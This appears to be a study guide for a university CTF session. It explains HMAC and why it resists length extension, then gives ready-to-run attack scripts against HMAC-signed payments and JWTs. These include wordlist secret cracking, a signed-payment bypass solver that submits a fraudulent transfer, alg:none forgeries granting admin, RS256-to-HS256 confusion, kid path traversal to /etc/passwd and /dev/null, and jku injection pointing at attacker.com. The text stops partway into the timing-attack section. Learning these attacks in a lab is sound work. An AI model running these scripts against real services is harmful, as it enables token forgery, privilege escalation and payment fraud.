# HMAC: Theory, Every Attack Case, Ready-to-Use Scripts

HMAC is the **correct way** to authenticate with a hash function. Unlike MD5/SHA-1/SHA-2 used directly (`H(secret || msg)`), HMAC is **structurally immune to length extension**. That's why **both** HMAC-related session tasks (**Signed, Sealed, Misinterpreted** and **Token of Trust**) use HMAC-SHA256 — the algorithm is right, the **application logic is wrong**.

This section covers:
- HMAC construction and why it's secure
- Why length extension **does not work** on HMAC (with proof)
- The **10 attack vectors** — all targeting usage, not the algorithm
- **Full scripts for both session tasks**
- Quick reference for the session

---

## 1. What is HMAC (formally)

HMAC (RFC 2104, FIPS 198-1) was invented by Bellare, Canetti, and Krawczyk in 1996 to build a **MAC** from any hash function.

### 1.1 Construction

```
HMAC(K, M) = H( (K⁺ ⊕ opad) || H( (K⁺ ⊕ ipad) || M ) )
```

Where:
- `H` = any hash (MD5, SHA-1, SHA-256, SHA-512, SHA-3, ...)
- `K` = secret key
- `K⁺` = key padded to **block size** (`b` bytes) with **zeros on the right**
- `ipad` = `0x36` repeated `b` times (inner pad)
- `opad` = `0x5c` repeated `b` times (outer pad)
- `b` = block size of `H` (64 for MD5/SHA-1/SHA-256, 128 for SHA-384/SHA-512)

### 1.2 Visualization

```
              K⁺ (b bytes)
                │
        ┌───────┴───────┐
        │               │
      ⊕ ipad          ⊕ opad
        │               │
        ▼               ▼
   [K⁺⊕ipad]        [K⁺⊕opad]
        │               │
        M               │
        │               │
        ▼               ▼
    H(inner) ────► H(outer) ────► HMAC tag
```

### 1.3 Parameters

| Hash | Block size `b` | Output size `n` | HMAC name |
|---|---|---|---|
| MD5 | 64 | 16 | HMAC-MD5 |
| SHA-1 | 64 | 20 | HMAC-SHA1 |
| SHA-256 | 64 | 32 | **HMAC-SHA256** ⭐ |
| SHA-384 | 128 | 48 | HMAC-SHA384 |
| SHA-512 | 128 | 64 | HMAC-SHA512 |
| SHA3-256 | 136 | 32 | HMAC-SHA3-256 |

### 1.4 Standard Python usage

```python
import hmac
import hashlib

# HMAC-SHA256 (the most common)
tag = hmac.new(b"secret_key", b"message", hashlib.sha256).digest()

# HMAC-SHA256 as hex (for HTTP headers, JWT, etc.)
tag_hex = hmac.new(b"secret_key", b"message", hashlib.sha256).hexdigest()

# Verify (ALWAYS constant-time!)
def verify(key: bytes, msg: bytes, provided: bytes) -> bool:
    expected = hmac.new(key, msg, hashlib.sha256).digest()
    return hmac.compare_digest(expected, provided)
```

### 1.5 Properties (memorize)

| Property | Value |
|---|---|
| Output size | = hash output size (`n`) |
| Key size | any (truncated/padded to `b`) |
| Speed | ~2 hash calls + 2 compression functions |
| **Length extension** | ❌ **IMMUNE** |
| Collision resistance | Same as underlying hash |
| Weak key attacks | Yes — if key is from a dictionary |

---

## 2. Why HMAC is immune to length extension

### 2.1 The structural argument

**Length extension on `H(K || M)`** works because:
- The hash **output IS the internal state** after processing `K || M`.
- An attacker who sees `H(K || M)` knows the state.
- They can continue the hash from that state with any extension.
- Result: `H(K || M || padding || extension)` **without knowing `K`**.

**Why HMAC blocks this:**
- The **outer hash** `H((K⁺⊕opad) || inner)` is computed **last**.
- The **inner hash** `H((K⁺⊕ipad) || M)` is **not the final output** — it's an intermediate.
- The attacker sees `HMAC(K, M)`, which is the **outer hash output**.
- They don't see the **inner hash output** — so they don't know the inner state.
- Even if they knew the inner hash, the outer hash masks it with `K⁺⊕opad`.

**Formally:** to extend `HMAC(K, M)` to `HMAC(K, M || extension)`, you'd need to:
1. Recompute `H((K⁺⊕ipad) || M || extension)` — needs `K` (unknown).
2. Then hash that with `K⁺⊕opad` — also needs `K` (unknown).

**You can't do either without the key.** Length extension is **structurally blocked**.

### 2.2 Demonstration script

```python
#!/usr/bin/env python3
"""Prove that HMAC-SHA256 is NOT vulnerable to length extension."""
import hmac
import hashlib

def demo_length_extension_impossible():
    secret = b"MY_SECRET_KEY"
    msg = b"user=guest"
    extension = b"&role=admin"

    # 1) Server computes HMAC(secret, msg)
    tag = hmac.new(secret, msg, hashlib.sha256).digest()
    print(f"[*] HMAC-SHA256(secret, msg) = {tag.hex()}")

    # 2) Attacker tries to forge HMAC(secret, msg || padding || extension)
    # WITHOUT knowing secret.
    # 
    # Naive attempt: pretend that we can "continue" from `tag`
    # (this would work for SHA256(secret || msg), but NOT for HMAC)
    
    # The attacker's guess: HMAC(secret, msg || "\x06" || extension)
    # 
    # But HMAC is: H((K⁺⊕opad) || H((K⁺⊕ipad) || (msg || extension)))
    # 
    # The INNER hash is H((K⁺⊕ipad) || msg) — that's not `tag`.
    # `tag` is the OUTER hash. Without knowing the inner hash, 
    # the attacker cannot compute the new outer hash.
    
    # Even if the attacker could extend the INNER hash (they can't,
    # without knowing K⁺⊕ipad), they'd still need K⁺⊕opad for the outer.
    
    print("[*] Attacker sees: outer hash only")
    print("[*] Attacker needs: inner hash + K⁺⊕opad")
    print("[*] Length extension is IMPOSSIBLE")


    # Contrast: SHA256(secret || msg) IS vulnerable
    naive_tag = hashlib.sha256(secret + msg).digest()
    print(f"\n[*] SHA256(secret || msg) = {naive_tag.hex()}")
    print("[!] This construction IS vulnerable to length extension")
    print("[!] Use HMAC instead")


demo_length_extension_impossible()
```

### 2.3 What this means for the session

**If a challenge uses HMAC** (any variant) → **length extension is off the table**.

**The attack must be something else:**
- Weak key
- JSON canonicalization
- JWT structure
- Timing
- Truncated HMAC
- Key reuse / confusion

---

## 3. Attack taxonomy — where HMAC fails

HMAC the **algorithm** is not broken. **All attacks target the usage.**

| # | Attack | Applies to | Session relevance |
|---|---|---|---|
| 1 | **Weak secret (wordlist)** | Any HMAC | **Token of Trust** |
| 2 | **JSON canonicalization bypass** | Signed JSON | **Signed, Sealed** ⭐⭐⭐ |
| 3 | **JWT `alg:none`** | JWT HS256 | **Token of Trust** ⭐⭐⭐ |
| 4 | **JWT algorithm confusion** | JWT RS256→HS256 | **Token of Trust** |
| 5 | **JWT `kid` injection** | JWT | Token of Trust (fallback) |
| 6 | **JWT `jku`/`x5u` injection** | JWT | Token of Trust (fallback) |
| 7 | **Timing attack** | Non-constant-time compare | Rare |
| 8 | **Truncated HMAC** | `tag[:N]` | Possible |
| 9 | **HMAC key reuse** | Same key for enc + MAC | Possible |
| 10 | **MAC-then-encrypt** | Padding oracle | Theoretical |
| 11 | **Length extension** | — | ❌ **blocked** |
| 12 | **HMAC collision** | Same as underlying hash | ❌ infeasible (SHA-256) |

---

## 4. Attack 1 — Weak secret (wordlist) ⭐

### 4.1 Description

HMAC's security depends entirely on the key. If the key is a **dictionary word**, brute force it.

### 4.2 Full script (`crack_hmac_wordlist.py`)

```python
#!/usr/bin/env python3
"""Crack HMAC with weak secret from wordlist.
Usage:
    python crack_hmac_wordlist.py --msg "message" --tag <hex> --wordlist rockyou.txt
    python crack_hmac_wordlist.py --msg <hex> --tag <hex> --algo sha256 --wordlist rockyou.txt
"""
import hmac
import hashlib
import argparse

ALGOS = {
    "md5": hashlib.md5,
    "sha1": hashlib.sha1,
    "sha256": hashlib.sha256,
    "sha512": hashlib.sha512,
    "sha3_256": hashlib.sha3_256,
}


def crack_hmac(msg: bytes, target_tag: bytes, wordlist: str,
                algo: str = "sha256") -> bytes | None:
    hasher = ALGOS[algo]
    with open(wordlist, "rb") as f:
        for line in f:
            key = line.rstrip(b"\r\n")
            if not key:
                continue
            if hmac.compare_digest(
                hmac.new(key, msg, hasher).digest(),
                target_tag,
            ):
                return key
    return None


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--msg", required=True, help="message (string or hex with --hex)")
    ap.add_argument("--tag", required=True, help="HMAC tag (hex)")
    ap.add_argument("--wordlist", default="rockyou.txt")
    ap.add_argument("--algo", default="sha256", choices=ALGOS.keys())
    ap.add_argument("--hex", action="store_true", help="msg is hex-encoded")
    args = ap.parse_args()

    msg = bytes.fromhex(args.msg) if args.hex else args.msg.encode()
    tag = bytes.fromhex(args.tag)

    print(f"[*] Cracking HMAC-{args.algo} with {args.wordlist}...")
    key = crack_hmac(msg, tag, args.wordlist, args.algo)
    if key:
        print(f"[+] KEY FOUND: {key!r}")
        print(f"[+] Verify: {hmac.new(key, msg, ALGOS[args.algo]).hexdigest()}")
    else:
        print("[!] Not found in wordlist")
```

### 4.3 Usage

```bash
# Crack HMAC-SHA256 with rockyou
python crack_hmac_wordlist.py \
  --msg "user=guest&role=user" \
  --tag "a3b4c5..." \
  --wordlist rockyou.txt

# Crack HMAC-MD5 with rockyou
python crack_hmac_wordlist.py \
  --msg "user=guest" --tag "..." \
  --algo md5 --wordlist rockyou.txt
```

### 4.4 Performance

| Hash | Speed (Python, HMAC) |
|---|---|
| HMAC-MD5 | ~5 × 10⁵ H/s |
| HMAC-SHA1 | ~5 × 10⁵ H/s |
| **HMAC-SHA256** | ~5 × 10⁵ H/s |
| HMAC-SHA512 | ~3 × 10⁵ H/s |

**rockyou.txt** (14M): ~30–45 s in Python.
**GPU** (`hashcat -m 1450` for HMAC-SHA256): ~5 billion/sec.

### 4.5 When to use

- **Token of Trust** if the JWT uses HS256 with a weak secret — **the wordlist attack is the classic JWT exploit**.
- **Signed, Sealed** if the JSON signing key is a dictionary word.

---

## 5. Attack 2 — JSON canonicalization bypass ⭐⭐⭐ (**Signed, Sealed**)

### 5.1 The bug class

Server signs JSON with HMAC-SHA256 over a **canonical form**:
```python
def canonicalize(payment):
    return json.dumps(
        payment,
        sort_keys=True,
        separators=(",", ":"),
        ensure_ascii=True,
    ).encode("utf-8")
```

But the server **parses** the submitted JSON with `json.loads`, which may **interpret** it differently from how the signature was computed.

**The attack:** submit a body that **parses to attacker's payment** but **canonicalizes to the legitimate payment** (or exploit a logic bug where the server verifies against one data and processes another).

### 5.2 The "may reuse the signature" hint

The task says: *"You may reuse the signature supplied by the challenge endpoint."*

This is the strongest hint. It suggests:

**Approach A — Replay logic bug:** The server verifies the signature against the **challenge payment** (which it knows) but **processes the submitted payment** (which we control).

**Approach B — Canonicalization bypass:** The server parses our submission, then canonicalizes it, and compares to the challenge payment's canonical form. We need to find a body that **parses to our payment** but **canonicalizes to the challenge's canonical form**.

**Approach C — Parser differential:** The server uses two different JSON parsers (or the same parser with different options) between verification and processing.

### 5.3 Full script — tries all approaches

```python
#!/usr/bin/env python3
"""Signed, Sealed, Misinterpreted — comprehensive attacker.
Usage:
    python solve_signed_sealed.py [--target http://...]
"""
import requests
import json
import sys
import base64

TARGET = "http://cns-test.idlab.uantwerpen.be:50007"


def get_challenge() -> dict:
    r = requests.get(f"{TARGET}/challenge", timeout=10)
    r.raise_for_status()
    return r.json()


def submit(body: bytes, sig: str, content_type="application/json") -> requests.Response:
    return requests.post(
        f"{TARGET}/vault",
        data=body,
        headers={"X-Signature": sig, "Content-Type": content_type},
        timeout=10,
        allow_redirects=False,
    )


def attempt(label: str, body: bytes, sig: str, content_type="application/json") -> bool:
    print(f"\n{'='*60}")
    print(f"[*] {label}")
    print(f"[>] body ({len(body)} bytes): {body[:200]}")
    try:
        r = submit(body, sig, content_type)
        print(f"[<] {r.status_code}")
        print(f"[<] {r.text[:400]}")
        if "cns{" in r.text:
            print(f"\n{'='*60}")
            print(f"[+] FLAG FOUND: {r.text}")
            return True
    except Exception as e:
        print(f"[!] Error: {e}")
    return False


def make_evil(legit: dict) -> dict:
    """Craft the fraudulent payment we want to submit."""
    return {
        "reference": "pwn-001",
        "from_account": "SIM-EVIL",
        "to_account": legit.get("to_account", "SIM-BOB"),
        "amount": legit.get("amount", 10),
        "currency": legit.get("currency", "EUR"),
        "timestamp": legit.get("timestamp", "2024-01-01T00:00:00Z"),
    }


def main():
    challenge = get_challenge()
    print(f"[*] Challenge response: {json.dumps(challenge, indent=2)[:500]}")

    # Extract payment + signature (handle various key names)
    legit = challenge.get("payment") or challenge.get("payload") or challenge
    sig = (challenge.get("signature") or challenge.get("sig") or
           challenge.get("hmac") or "")
    print(f"\n[*] Legit payment: {json.dumps(legit)}")
    print(f"[*] Signature: {sig}")

    evil = make_evil(legit)
    print(f"\n[*] Evil payment:  {json.dumps(evil)}")

    # ============================================================
    # Approach 1 — Direct replay (logic bug)
    # ============================================================
    body = json.dumps(evil, sort_keys=True, separators=(",", ":")).encode()
    if attempt("1a. Direct replay — evil body + legit sig", body, sig):
        return

    # Also try compact vs default
    body = json.dumps(evil).encode()
    if attempt("1b. Direct replay (default separators)", body, sig):
        return

    # ============================================================
    # Approach 2 — Send legit body (sanity check)
    # ============================================================
    body = json.dumps(legit, sort_keys=True, separators=(",", ":")).encode()
    if attempt("2. Sanity — legit body + legit sig", body, sig):
        return

    # ============================================================
    # Approach 3 — Duplicate keys
    # ============================================================
    # Parser takes LAST key, verifier takes FIRST (or vice versa)
    # Submit evil value FIRST, legit value LAST → parser sees legit,
    # processor (if using first) sees evil
    fields = ["reference", "from_account", "to_account", "amount", "currency", "timestamp"]
    parts = []
    for f in fields:
        if f in evil and f in legit and evil[f] != legit[f]:
            # Duplicate key: evil first, legit last
            parts.append(f'"{f}":{json.dumps(evil[f])}')
            parts.append(f'"{f}":{json.dumps(legit[f])}')
        else:
            v = evil.get(f, legit.get(f))
            parts.append(f'"{f}":{json.dumps(v)}')
    body = ("{" + ",".join(parts) + "}").encode()
    if attempt("3a. Duplicate keys (evil first, legit last)", body, sig):
        return

    # Reverse: legit first, evil last (if parser takes last but canonicalizer
    # somehow processes first)
    parts = []
    for f in fields:
        if f in evil and f in legit and evil[f] != legit[f]:
            parts.append(f'"{f}":{json.dumps(legit[f])}')
            parts.append(f'"{f}":{json.dumps(evil[f])}')
        else:
            v = evil.get(f, legit.get(f))
            parts.append(f'"{f}":{json.dumps(v)}')
    body = ("{" + ",".join(parts) + "}").encode()
    if attempt("3b. Duplicate keys (legit first, evil last)", body, sig):
        return

    # ============================================================
    # Approach 4 — Type juggling on amount
    # ============================================================
    for label, amount_val in [
        ("int 10", 10),
        ("float 10.0", 10.0),
        ("exp 1e1", 1e1),
        ("string '10'", "10"),
    ]:
        e = dict(evil); e["amount"] = amount_val
        body = json.dumps(e, sort_keys=True, separators=(",", ":")).encode()
        if attempt(f"4. Type juggling amount={label}", body, sig):
            return

    # ============================================================
    # Approach 5 — Unicode escapes
    # ============================================================
    # Replace one character with its \u escape in an "evil" field
    body = json.dumps(evil, sort_keys=True, separators=(",", ":"))
    body_escaped = body.replace('"SIM-EVIL"', '"\\u0053IM-EVIL"')
    if attempt("5a. Unicode escape in from_account",
               body_escaped.encode(), sig):
        return

    # ============================================================
    # Approach 6 — Whitespace preservation
    # ============================================================
    for label, sep in [
        ("compact", (",", ":")),
        ("default", None),
        ("space after colon", (",", ": ")),
        ("space after comma", (", ", ":")),
    ]:
        e = dict(evil)
        if sep is None:
            body = json.dumps(e).encode()
        else:
            body = json.dumps(e, sort_keys=True, separators=sep).encode()
        if attempt(f"6. Whitespace variant: {label}", body, sig):
            return

    # ============================================================
    # Approach 7 — Extra fields (some servers ignore unknown fields)
    # ============================================================
    e = dict(evil)
    e["extra"] = "x"
    e["admin"] = True
    e["role"] = "admin"
    body = json.dumps(e, sort_keys=True, separators=(",", ":")).encode()
    if attempt("7. Extra fields", body, sig):
        return

    # ============================================================
    # Approach 8 — Try signing only subsets of fields
    # ============================================================
    # (In case the server only signs some fields, e.g., "reference")
    for signed_fields in [
        ["reference"],
        ["amount", "currency"],
        ["reference", "amount"],
        ["from_account", "to_account", "amount"],
    ]:
        subset_evil = {k: evil[k] for k in signed_fields if k in evil}
        e = dict(evil)
        for k in signed_fields:
            if k in legit:
                e[k] = legit[k]   # keep legit values in signed fields
        body = json.dumps(e, sort_keys=True, separators=(",", ":")).encode()
        if attempt(f"8. Only sign {signed_fields}, keep evil elsewhere",
                   body, sig):
            return

    # ============================================================
    # Approach 9 — POST with different Content-Type
    # ============================================================
    body = json.dumps(evil, sort_keys=True, separators=(",", ":")).encode()
    for ct in ["text/plain", "application/json; charset=utf-8",
               "application/x-www-form-urlencoded"]:
        if attempt(f"9. Content-Type: {ct}", body, sig, content_type=ct):
            return

    # ============================================================
    # Approach 10 — Raw body attack (signature over raw body)
    # ============================================================
    # If signature is over the raw bytes (not canonicalized), try
    # sending the exact challenge response body with evil substituted
    raw_legit = json.dumps(legit, sort_keys=True, separators=(",", ":")).encode()
    if attempt("10. Raw legit body", raw_legit, sig):
        return

    print(f"\n{'='*60}")
    print("[!] No simple bypass worked.")
    print("[!] Inspect the server code for the actual bug.")
    print("[!] Check: what does /challenge return? what does /vault expect?")


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1].startswith("http"):
        TARGET = sys.argv[1]
    main()
```

### 5.4 What each approach tests

| Approach | What it exploits |
|---|---|
| **1. Direct replay** | Server verifies against challenge payment, processes submitted |
| **2. Sanity** | Confirms the basic flow works (do this before debugging) |
| **3. Duplicate keys** | Parser takes one value, processor takes another |
| **4. Type juggling** | Canonicalizer formats `10`, `10.0`, `1e1`, `"10"` differently |
| **5. Unicode escapes** | Canonicalizer's `ensure_ascii` vs parser's unescape |
| **6. Whitespace** | Raw body signed vs parsed-then-canonicalized |
| **7. Extra fields** | Server signs only some fields, ignores others |
| **8. Subset signing** | Server signs a subset (e.g., only `reference`) |
| **9. Content-Type** | Server parses differently for different MIME types |
| **10. Raw body** | Signature over raw bytes, not canonical form |

### 5.5 Debugging at the session

If none of the above work, **read the server response carefully** — the error message may say:
- `"signature mismatch"` → canonicalization issue
- `"invalid signature format"` → wrong header format
- `"missing field"` → required field not present
- `"invalid JSON"` → parser rejecting our body

**Try to trigger verbose errors** — many CTF servers print stack traces with hints.

---

## 6. Attack 3 — JWT `alg:none` ⭐⭐⭐ (**Token of Trust**)

### 6.1 JWT structure

```
header.payload.signature
  b64u    b64u     b64u
```

Each part is **base64url-encoded** (no padding).

```
header:    {"alg":"HS256","typ":"JWT"}
payload:   {"user":"guest","role":"guest"}
signature: HMAC-SHA256(secret, header + "." + payload)
```

**`alg:none`** — some JWT libraries accept **unsigned tokens** if the header says `"alg":"none"` and the signature part is **empty**.

### 6.2 Full script (`solve_jwt_alg_none.py`)

```python
#!/usr/bin/env python3
"""JWT alg:none attack — try all variants."""
import requests
import json
import base64
import sys

TARGET = "http://cns-test.idlab.uantwerpen.be:50009"


def b64u_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def b64u_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def decode_jwt(token: str) -> tuple[dict, dict, bytes]:
    h, p, s = token.split(".")
    return json.loads(b64u_decode(h)), json.loads(b64u_decode(p)), b64u_decode(s)


def try_token(token: str, label: str, endpoint: str = "/admin") -> bool:
    print(f"\n[*] {label}")
    print(f"[>] token: {token[:80]}{'...' if len(token) > 80 else ''}")
    try:
        r = requests.get(f"{TARGET}{endpoint}",
                         headers={"Authorization": f"Bearer {token}"},
                         timeout=10, allow_redirects=False)
        print(f"[<] {r.status_code}: {r.text[:300]}")
        if "cns{" in r.text or r.status_code == 200:
            if "cns{" in r.text:
                print(f"\n[+] FLAG: {r.text}")
                return True
    except Exception as e:
        print(f"[!] {e}")
    return False


def main():
    # 1) Login to get a guest token
    print("[*] Logging in as guest...")
    r = requests.post(
        f"{TARGET}/login",
        json={"username": "guest", "password": "guest"},
        timeout=10,
    )
    print(f"[<] {r.status_code}: {r.text[:200]}")

    data = r.json()
    token = data.get("token") or data.get("access_token") or data.get("jwt")
    if not token:
        print("[!] No token in login response")
        return

    h, p, _ = decode_jwt(token)
    print(f"\n[*] Header:  {h}")
    print(f"[*] Payload: {p}")

    # Mutations to try — one of these likely grants admin
    mutations = [
        {"role": "admin"},
        {"is_admin": True},
        {"admin": True},
        {"role": "administrator"},
        {"permissions": ["admin"]},
        {"scope": "admin"},
        {"user": "admin", "role": "admin"},
    ]

    # alg:none variants (case matters in some libraries!)
    alg_variants = [
        {"alg": "none", "typ": "JWT"},
        {"alg": "None", "typ": "JWT"},
        {"alg": "NONE", "typ": "JWT"},
        {"alg": "nOnE", "typ": "JWT"},
        {"alg": "noNe", "typ": "JWT"},
        {"alg": "", "typ": "JWT"},
        {"alg": None, "typ": "JWT"},
        {"typ": "JWT"},                    # no alg field at all
        {},                                # empty header
    ]

    for mutation in mutations:
        new_payload = {**p, **mutation}
        pl_b64 = b64u_encode(json.dumps(new_payload, separators=(",", ":")).encode())

        for hdr in alg_variants:
            hd_b64 = b64u_encode(json.dumps(hdr, separators=(",", ":")).encode())

            # Variant A: empty signature
            tok = f"{hd_b64}.{pl_b64}."
            if try_token(tok, f"alg:none ({hdr.get('alg','MISSING')}) + {mutation}"):
                return

            # Variant B: no trailing dot at all
            tok = f"{hd_b64}.{pl_b64}"
            if try_token(tok, f"no-dot ({hdr.get('alg','MISSING')}) + {mutation}"):
                return

            # Variant C: with original signature attached (some libs ignore)
            _, _, orig_sig = decode_jwt(token)
            sig_b64 = b64u_encode(orig_sig)
            tok = f"{hd_b64}.{pl_b64}.{sig_b64}"
            if try_token(tok, f"alg:none-with-sig ({hdr.get('alg','MISSING')}) + {mutation}"):
                return

    print("\n[!] alg:none failed — try other attacks (weak secret, confusion)")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        TARGET = sys.argv[1]
    main()
```

### 6.3 Why so many variants?

Different JWT libraries handle `alg:none` differently:
- `pyjwt` (old) accepts `none` **only** if explicitly enabled.
- `jwt.io` examples accept `none`, `None`, `NONE`.
- Some accept `{"alg":null}`.
- Some check **case-insensitively** for `"none"` in the signature part.
- Some libraries **skip signature verification entirely** if the signature part is empty.

**Try all → maximize chance of bypass.**

---

## 7. Attack 4 — JWT weak secret ⭐⭐

### 7.1 Description

HS256 = HMAC-SHA256. If the secret is a **dictionary word**, crack it and forge any token.

### 7.2 Full script (`solve_jwt_weak_secret.py`)

```python
#!/usr/bin/env python3
"""Crack JWT HS256 secret with wordlist."""
import hmac
import hashlib
import base64
import json
import argparse

def b64u_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def b64u_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def crack_jwt_hs256(token: str, wordlist: str,
                     algo: str = "sha256") -> bytes | None:
    """Crack HMAC secret for JWT. Returns key or None."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"Not a valid JWT: {len(parts)} parts")
    h_b64, p_b64, s_b64 = parts
    signing_input = f"{h_b64}.{p_b64}".encode()
    target_sig = b64u_decode(s_b64)

    hasher = getattr(hashlib, algo)

    with open(wordlist, "rb") as f:
        for i, line in enumerate(f):
            key = line.rstrip(b"\r\n")
            if not key:
                continue
            if hmac.compare_digest(
                hmac.new(key, signing_input, hasher).digest(),
                target_sig,
            ):
                return key
            if i % 1000000 == 0 and i > 0:
                print(f"    ... {i} tried")
    return None


def forge_jwt(token: str, secret: bytes, mutations: dict,
               algo: str = "sha256") -> str:
    """Forge a new JWT with the recovered secret."""
    _, p_b64, _ = token.split(".")
    original_payload = json.loads(b64u_decode(p_b64))
    new_payload = {**original_payload, **mutations}

    header = {"alg": algo.upper().replace("SHA", "HS") if algo != "sha256" else "HS256",
              "typ": "JWT"}
    h_b64 = b64u_encode(json.dumps(header, separators=(",", ":")).encode())
    p_b64 = b64u_encode(json.dumps(new_payload, separators=(",", ":")).encode())

    hasher = getattr(hashlib, algo)
    sig = hmac.new(secret, f"{h_b64}.{p_b64}".encode(), hasher).digest()
    s_b64 = b64u_encode(sig)

    return f"{h_b64}.{p_b64}.{s_b64}"


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("token")
    ap.add_argument("--wordlist", default="rockyou.txt")
    args = ap.parse_args()

    print(f"[*] Cracking HMAC-SHA256 secret for JWT...")
    secret = crack_jwt_hs256(args.token, args.wordlist)
    if secret:
        print(f"[+] SECRET: {secret!r}")
        print(f"[+] Forged token (admin):")
        print(forge_jwt(args.token, secret, {"role": "admin", "is_admin": True}))
    else:
        print("[!] Not found — try larger wordlist or alg:confusion")
```

### 7.3 Usage

```bash
# Crack JWT with rockyou
python solve_jwt_weak_secret.py "eyJhbGc..." --wordlist rockyou.txt

# Or with hashcat (much faster)
# hashcat -m 16500 jwt.txt rockyou.txt
```

### 7.4 Performance

| Tool | Speed |
|---|---|
| Python (as above) | ~5 × 10⁵ H/s |
| **hashcat -m 16500** | **~5 × 10⁹ H/s** (10,000× faster) |

**rockyou.txt** (14M): ~30 s in Python, **< 5 ms** in hashcat.

---

## 8. Attack 5 — JWT algorithm confusion (RS256 → HS256)

### 8.1 Description

If server uses **RS256** (RSA) but **also accepts HS256**, and the **public key** is known, you can use the **public key as the HMAC secret**:

```
HMAC-SHA256(public_key_pem, "header.payload")
```

The server verifies RS256 using the public key as an RSA key. But if `alg:HS256` is set, it uses **the same public key** as an **HMAC secret**.

### 8.2 Full script (`solve_jwt_confusion.py`)

```python
#!/usr/bin/env python3
"""JWT algorithm confusion: RS256 → HS256."""
import hmac
import hashlib
import base64
import json
import requests

def b64u_decode(s):
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))

def b64u_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def attack_confusion(token: str, public_key_pem: bytes,
                      mutations: dict) -> str:
    """
    Forge HS256 token using the public key as HMAC secret.
    Works if server's `alg` check is broken.
    """
    _, p_b64, _ = token.split(".")
    original_payload = json.loads(b64u_decode(p_b64))
    new_payload = {**original_payload, **mutations}

    header = {"alg": "HS256", "typ": "JWT"}
    h_b64 = b64u_encode(json.dumps(header, separators=(",", ":")).encode())
    p_b64 = b64u_encode(json.dumps(new_payload, separators=(",", ":")).encode())

    signing_input = f"{h_b64}.{p_b64}".encode()
    sig = hmac.new(public_key_pem, signing_input, hashlib.sha256).digest()
    s_b64 = b64u_encode(sig)

    return f"{h_b64}.{p_b64}.{s_b64}"


if __name__ == "__main__":
    # 1) Get public key from JWKS endpoint
    TARGET = "http://cns-test.idlab.uantwerpen.be:50009"
    try:
        r = requests.get(f"{TARGET}/.well-known/jwks.json", timeout=10)
        print(f"[*] JWKS: {r.text[:300]}")
    except:
        print("[!] No JWKS endpoint")

    # 2) Or from /publickey / /key endpoint
    try:
        r = requests.get(f"{TARGET}/publickey", timeout=10)
        public_key = r.text
        print(f"[*] Public key: {public_key[:100]}...")
    except:
        print("[!] No /publickey endpoint")

    # 3) If we have the public key, forge token
    # token = "..."
    # forged = attack_confusion(token, public_key.encode(), {"role": "admin"})
    # print(forged)
```

### 8.3 When to use

- JWT uses **RS256** (asymmetric).
- Challenge exposes the **public key** (JWKS endpoint, `/publickey`, `/cert`).
- Server **fails to enforce the algorithm**.

**This is rarer** in CTF (usually `alg:none` or weak secret works first).

---

## 9. Attack 6 — JWT `kid` injection

### 9.1 Description

`kid` (Key ID) in the JWT header tells the server **which key** to use for verification. If the server does:

```python
key = load_key(header["kid"])     # reads from filesystem
verify(token, key)
```

You can inject **path traversal**:
```json
{"kid": "../../../../etc/passwd", "alg": "HS256"}
```

Then the key becomes **`/etc/passwd`** — a known, attacker-readable file. Sign with HMAC using `/etc/passwd` as secret → server uses same file as secret → verify passes.

### 9.2 Full script

```python
def attack_kid_path_traversal(token: str, target_file: str = "/etc/passwd") -> str:
    """Inject kid=path traversal, sign with file contents as HMAC secret."""
    _, p_b64, _ = token.split(".")
    original_payload = json.loads(b64u_decode(p_b64))
    new_payload = {**original_payload, "role": "admin"}

    # Try various paths
    for kid in [
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "/etc/passwd",
        "../../../../dev/null",       # empty file → HMAC key = ""
    ]:
        header = {"alg": "HS256", "typ": "JWT", "kid": kid}
        h_b64 = b64u_encode(json.dumps(header, separators=(",", ":")).encode())
        p_b64 = b64u_encode(json.dumps(new_payload, separators=(",", ":")).encode())

        # If kid=/dev/null, HMAC key is empty
        try:
            with open(target_file, "rb") as f:
                key = f.read()
        except:
            key = b""

        sig = hmac.new(key, f"{h_b64}.{p_b64}".encode(), hashlib.sha256).digest()
        s_b64 = b64u_encode(sig)
        yield f"{h_b64}.{p_b64}.{s_b64}", kid
```

**`kid=/dev/null`** is the classic — key becomes empty string → sign with empty key → server reads `/dev/null` as empty → verify passes.

### 9.3 When to use

- JWT header has `kid` field.
- Server reads `kid` from filesystem.

---

## 10. Attack 7 — JWT `jku` / `x5u` injection

### 10.1 Description

`jku` (JWK Set URL) or `x5u` (X.509 URL) in the header tells the server where to fetch the public key. If server **follows attacker-controlled URL**:

```json
{"jku": "https://attacker.com/jwks.json", "alg": "RS256"}
```

You host a JWKS with your own key → sign with your private key → server fetches your public key → verify passes.

### 10.2 Full script (sketch)

```python
import json

def attack_jku_injection():
    """
    1. Host a JWKS at attacker.com with your own key.
    2. Inject jku=https://attacker.com/jwks.json into JWT header.
    3. Sign with your private key.
    """
    # Generate key pair (using cryptography library)
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization

    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    public_key = private_key.public_key()

    # Build JWKS with our public key
    jwks = {
        "keys": [{
            "kty": "RSA",
            "kid": "attacker-key",
            "use": "sig",
            "n": "...",   # base64url of n
            "e": "AQAB",
        }]
    }
    # Host at attacker.com/jwks.json

    # Then forge JWT with header {"alg":"RS256", "jku":"https://attacker.com/jwks.json", "kid":"attacker-key"}
    # Sign with our private key
```

### 10.3 When to use

- JWT header has `jku` or `x5u`.
- Server fetches URL from header (open redirect / SSRF).

**Rare but devastating when it works.**

---

## 11. Attack 8 — Timing attack (non-constant-time compare)

### 11.1 Description

If server compares HMAC with `==` (byte-by-byte, early-exit), the comparison takes **slightly longer for matching prefixes**. Measure timing → recover byte-by-byte.

**Python bug:**
```python
if expected_hmac == provided_hmac:   # VULNERABLE
